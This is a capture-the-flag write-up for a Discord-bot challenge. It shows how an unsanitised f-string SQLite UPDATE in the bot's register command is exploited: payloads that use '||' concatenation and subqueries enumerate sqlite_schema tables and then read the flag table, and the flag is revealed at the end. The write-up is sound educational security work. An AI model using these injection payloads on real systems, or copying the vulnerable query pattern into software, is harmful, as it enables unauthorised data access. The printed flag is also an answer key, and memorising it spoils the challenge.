Title: help v2.0

Description:
```
Heard of Dank Memer Beta? Introducing Dank Memer Sigma, the Dank Memer that's Simply Danker!
```

Given files: [main.py](https://github.com/Coder-Here/HACK-AC-2022-CTF/blob/main/Misc/help%20v2.0/main.py "main.py")

Given hints: It's not your typical SQL Injection, remember that you can concatenate strings with `||`

This is one of the most unique challenges I have ever seen, using a Discord bot! Let's see what we can do with the bot.

![image](https://user-images.githubusercontent.com/63996033/199575493-1089a584-0307-4421-a3ea-9246adaf4acb.png)

The main exploit here is that main.py uses SQLite and /register allows user input and /whoami allows the output(of the flag also).

![image](https://user-images.githubusercontent.com/63996033/199575909-ebeb3b67-a619-4da6-a997-64cdc0f12f10.png)

/help is not helpful. (lol)

![image](https://user-images.githubusercontent.com/63996033/199576012-2843e550-f82b-4828-8d68-81cf5b696c93.png)

/register allows me to input data, and possibly our payload.

Let's check the main.py script for the /register command.

```cursor.execute(f"update users set username = '{username}'")```

Aha, our input is not sanitised and we can payload into here. We also need to use || later. Since it's a update command, we can run a select command from inside it. So our main target is to find which table the flag is located in and get it.

So our payload will look like:

```
cursor.execute(f"update users set username = '<payload here>'")
' || <select statement> || '
```

So here is what I did. I needed 'sqlite_schema' table to get the names of all other tables. Use brackets for the select statement so that it gets executed first.

```
' || (SELECT name FROM sqlite_schema WHERE type='table' ORDER BY name DESC LIMIT 1,15) || '
```

What this does it that it gets the name of the table from the master table which contains the data of other tables, so that we can find the correct table name. We ordered it by descending order, and get the 1st one. We will do this for all but first, we need to know what we got from this payload. So we can use /whoami command.

![image](https://user-images.githubusercontent.com/63996033/199578091-4846e182-f921-4452-b7fb-72ea841262fd.png)

![image](https://user-images.githubusercontent.com/63996033/199578134-987873d7-f969-4748-b7ee-216572593333.png)

![image](https://user-images.githubusercontent.com/63996033/199578158-bb89df40-6d2a-40f6-9c2b-f2687e7a5a69.png)

![image](https://user-images.githubusercontent.com/63996033/199578190-c5cba2b2-6b28-4e70-959d-135963ab301a.png)

So Discord makes it a spoiler because of the '||' characters. So the first table is not needed. Let's try other ones by changing the payload.

```
' || (SELECT name FROM sqlite_schema WHERE type='table' ORDER BY name DESC LIMIT 1,15) || '
' || (SELECT name FROM sqlite_schema WHERE type='table' ORDER BY name DESC LIMIT 2,15) || '
' || (SELECT name FROM sqlite_schema WHERE type='table' ORDER BY name DESC LIMIT 3,15) || '
' || (SELECT name FROM sqlite_schema WHERE type='table' ORDER BY name DESC LIMIT 4,15) || '

etc
```

![image](https://user-images.githubusercontent.com/63996033/199578642-f876e742-ff05-4930-b714-c9ecd9be3d4f.png)

![image](https://user-images.githubusercontent.com/63996033/199578670-67d411d1-824e-4795-836b-9e99ed4397d7.png)

![image](https://user-images.githubusercontent.com/63996033/199578701-b5cca805-5cde-421b-9508-e71f3529eedd.png)

So the 4th table seems to contain the flag. Similarly, we change our payload. Then use /whoami to get our flag.

```
' || (SELECT * FROM flag327a6c4304ad5938eaf0efb6cc3e53dc) || '
```

![image](https://user-images.githubusercontent.com/63996033/199579021-e4fb3068-8dca-4f07-acd8-2f64afbb912d.png)

There we go, we got our flag.

Flag: ACSI{d4nk3r_m3m3r}
